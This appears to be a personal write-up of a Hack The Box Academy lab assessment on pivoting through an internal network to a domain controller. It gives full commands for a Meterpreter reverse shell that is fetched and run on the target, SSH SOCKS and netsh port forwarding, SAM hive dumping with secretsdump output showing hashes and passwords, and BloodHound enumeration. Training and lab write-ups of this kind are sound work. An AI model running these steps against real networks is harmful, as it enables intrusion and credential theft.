# Pivoting Tunneling and Port Forwarding Skills Assessment  

[Skills Assessment](https://academy.hackthebox.com/module/158/section/1441)  

## Objective  

* Start from external Kali VM and access the first system via the web shell left in place.
* Use the web shell access to enumerate and pivot to an internal host.
* Continue enumeration and pivoting until you reach the `Inlanefreight` Domain Controller and capture the associated flag.
* Use any data, credentials, scripts, or other information within the environment to enable your pivoting attempts.
* Grab all flags that can be found.  

## Network Map  

>This diagram of the targets on the network was drawn after the skills assessment.  

![pivot skills assessment map](/images/pivot-skills-assessment-map.png)  

## Enumeration  

>Connecting Info `10.129.201.127` for the webshell on ` support.inlanefreight.local`.  

![Pivot skills assessment webshell](/images/pivot-skills-assessment-webshell.png)  

### Initial Reverse Shell  

>Setup a [Meterpreter reverse shell - Meterpreter Tunneling & Port Forwarding](https://academy.hackthebox.com/module/158/section/1428) to target `10.129.201.127`.
>MSFconsole multi handler listen on port 8080

```
sudo msfconsole

use exploit/multi/handler
set LHOST 10.10.15.124
set LPORT 8080
set payload linux/x64/meterpreter/reverse_tcp
run
```  

![pivot skills assessment msfconsole](/images/pivot-skills-assessment-msfconsole.png)  

>Create msfvenom payload:  

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.124 -f elf -o backupjob LPORT=8080
```  

>Host payload on kali attack host.

```
python3 -m http.server 443
```  

>In webshell on target execute `wget` to upload `elf` reverse shell connection. The set execute permissions and run to make connection.  

```
cd /tmp 
wget 10.10.15.124:443/backupjob -O backupjob
chmod +x backupjob
./backupjob
```  

![pivot-skills-assessment-msfvenom](/images/pivot-skills-assessment-msfvenom.png)  

### Initial Enumeration  

>Once on the target webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network.  
>In the home folder `/home/webadmin` discover the file `for-admin-eyes-only` and an `id_rsa` openssh private key file.  

```
cd /home/webadmin
cat for-admin-eyes-only
cat id_rsa
```  

>The contents of the file `for-admin-eyes-only`:  

```
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of : 
Plain Human work!
```  

>Within the webadmin user's directory, found the credential ssh key.  

## Foothold - Ubuntu  

>SSH with the `id_rsa` key to the ubuntu server as webadmin user and read the webadmin `bash_history`.

```
ssh webadmin@support.inlanefreight.local -i webadmin-rsa
cat .bash_history
```  

### Dynamic Port Forward + ProxyChain  

>[Dynamic Port Forwarding with SSH, SOCKS Tunneling and proxychain commands](https://academy.hackthebox.com/module/158/section/1426)  

>Proxychain configuration file, `tail /etc/proxychains4.conf`:    

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4        127.0.0.1 9050
socks5  127.0.0.1 9050
```  

>Enabling Dynamic Port Forwarding with SSH  

```
ssh -D 9050 webadmin@support.inlanefreight.local -i webadmin-rsa
```  

![pivot-skills-assessment-dynamic-port-forward](/images/pivot-skills-assessment-dynamic-port-forward.png)  

## Enumeration via Proxychains  

>With the dynamic port forwarding using `ssh` through port `9050` and proxychains setup, we run enumeration commands from kali attack host.  

```
proxychains nmap 172.16.5.35
```

>Proxychain NMAP Scan results:  

```
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```  

>Remote desktop via Proxychains with the username `mlefay` and the password of `Plain Human work!` obtain in the text file `for-admin-eyes-only` on ubuntu server.  
>XfreeRDP session with dynamic map drive to the local kali attack host path, `/home/kali/Downloads/htb/academy/webadmin`.  

```
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /dynamic-resolution /cert:ignore /drive:kali-drive,/home/kali/Downloads/htb/academy/webadmin
```  

>Enumeration of the windows server `pivot-srv01.inlanefreight.local` reveal is part of Active Directory Domain and has 2 network interfaces:
* 172.16.5.35
* 172.16.6.35  

![pivot-skills-assessment-pivot-srv01](/images/pivot-skills-assessment-pivot-srv01.png)  

### Attacking SAM  

>[Attacking SAM](https://academy.hackthebox.com/module/147/section/1315)
>With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline.  

>Save security registry hives to local host and copy to Kali via RDP drive mapping.  

```
cd c:\temp
reg.exe save hklm\sam C:\temp\sam.save
reg.exe save hklm\system C:\temp\system.save
reg.exe save hklm\security C:\temp\security.save
```  

![pivot-skills-assessment-SAM-Attack](/images/pivot-skills-assessment-SAM-Attack.png)  

>Dumping Hashes with Impacket's secretsdump.py  

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```  

>Obtained hashes from dump:  

```
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#7b2aeb20037c28bc44032f7081f304df: (2022-05-17 16:09:37)
INLANEFREIGHT.LOCAL/vfrank:$DCC2$10240#vfrank#cfaf1869163aa26757496e1cd9970316: (2022-05-18 18:38:43)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:7a00340050004e0024<snip>037002300
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:21ce18b1a025d4b0b01c0e716e99d476
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x2c1bed0e346af06d64c32dcfd108d8fb3af1e353
dpapi_userkey:0x8a888dcf7becc69d4065caf26b6a534ab160144c
[*] NL$KM 
 0000   A2 52 9D 31 0B B7 1C 75  45 D6 4B 76 41 2D D3 21   .R.1...uE.KvA-.!
 0010   C6 5C DD 04 24 D3 07 FF  CA 5C F4 E5 A0 38 94 14   .\..$....\...8..
 0020   91 64 FA C7 91 D2 0E 02  7A D6 52 53 B4 F4 A9 6F   .d......z.RS...o
 0030   58 CA 76 00 DD 39 01 7D  C5 F7 8F 4B AB 1E DC 63   X.v..9.}...K...c
NL$KM:a2529d310bb71c7545d64b76412dd321c65<snip>a96f58ca7600dd39017dc5f78f4bab1edc63
[*] _SC_DHCPServer 
(Unknown User):Imply wet Unmasked!
[*] _SC_SCardSvr 
(Unknown User):Imply wet Unmasked!
[*] Cleaning up... 
```  

>From the above secrets hash dump we obtained the clear text password of `Imply wet Unmasked!` for the domain Administrator: `INLANEFREIGHT.LOCAL/vfrank`.  

## Window Port Forward Netsh  

>Using `netsh` to forward traffic from windows server to windows 10 workstation for `vfrank` user. 
>[Port Forwarding with Windows Netsh](https://academy.hackthebox.com/module/158/section/1435)  
>In command prompt on the windows server `172.16.5.35`, create a `netsh` port forwarding proxy.  

```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=172.16.5.35 connectport=3389 connectaddress=172.16.6.25
```  

>On `172.16.5.35` the listen port `8080` will direct traffic to port `3389` for destination target IP address `172.16.6.25`.  

```
proxychains xfreerdp /v:172.16.5.35:8080 /u:vfrank /p:'Imply wet Unmasked!' /d:INLANEFREIGHT.LOCAL /dynamic-resolution /cert:ignore /drive:kali-drive,/home/kali/Downloads/htb/academy/webadmin
```  

![pivot-skills-assessment-netsh](/images/pivot-skills-assessment-netsh.png)  

>Proxychains RDP session Connect as user `vfrank` from kali host.  

## Enumerate Win10 vFrank  

>Discover user `vfrank` is local administrator on the windows 10 workstation.
>Perform SAM attack again and copy save registry hives to kali via RDP tunnel.  

![pivot-skills-assessment-pivotwin10](/images/pivot-skills-assessment-pivotwin10.png)  

>Using secretsdump.py to extract NT hashes.

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```  

## Active Directory  

>Target the Domain with the credentials of `vfrank` and his password `Imply wet Unmasked!` for the `INLANEFREIGHT.LOCAL` domain.  

### Bloodhound  

>Transfer the windows binary `SharpHound.exe` to the windows 10 domain joined host to run data collection.  

```
sharphound.exe
```  

>Copy the collected ZIP data file to kali, to import into `Bloodhound`.  
>Login to `bloodhound as username `neo4j` and my favourite Ethical @ Hacking password since my studies in 2019!.  

![pivot-skills-assessment-sharphound](/images/pivot-skills-assessment-sharphound.png)  

>Bloodhound analysis query: Shortest paths to Domain Admins from Owned Principals indicate our use is domain admin member.

![End-of-the-rainbox](/images/End-of-the-rainbox.png)  
